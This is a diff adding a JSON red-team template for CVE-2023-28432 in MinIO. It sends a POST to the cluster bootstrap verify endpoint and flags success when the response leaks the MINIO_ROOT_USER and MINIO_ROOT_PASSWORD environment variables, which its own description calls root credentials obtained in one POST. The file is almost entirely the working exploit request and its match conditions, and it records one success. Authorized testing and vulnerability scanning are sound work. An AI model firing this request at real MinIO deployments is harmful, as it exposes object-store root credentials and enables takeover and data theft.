@@ -1,0 +1,31 @@
+{
+  "name": "redteam/MinIO bootstrap verify env disclosure",
+  "description": "[god] CVE-2023-28432 — MinIO cluster /minio/bootstrap/v1/verify returns all environment variables including MINIO_ROOT_USER/MINIO_ROOT_PASSWORD (NVD, Rapid7 module, vulhub): object-store root creds in one POST. Keywords: minio bootstrap verify env disclosure cve-2023-28432 root password. ctrl: patched builds 403 the bootstrap endpoint -> not falsified. base_url = MinIO root (cluster mode).",
+  "cwe": "CWE-200",
+  "requests": {
+    "payload": {
+      "method": "POST",
+      "url": "{{base_url}}/minio/bootstrap/v1/verify"
+    }
+  },
+  "conditions": [
+    {
+      "type": "status",
+      "request": "payload",
+      "equals": 200
+    },
+    {
+      "type": "body_regex",
+      "request": "payload",
+      "pattern": "MINIO_ROOT_USER|MINIO_ROOT_PASSWORD|MinioEnv"
+    }
+  ],
+  "params": [
+    "base_url"
+  ],
+  "source": "imported",
+  "successes": 1,
+  "id": "97ff766716ed",
+  "created": "2026-11-06T00:00:00+00:00",
+  "last_used": "2026-11-06T00:00:00+00:00"
+}
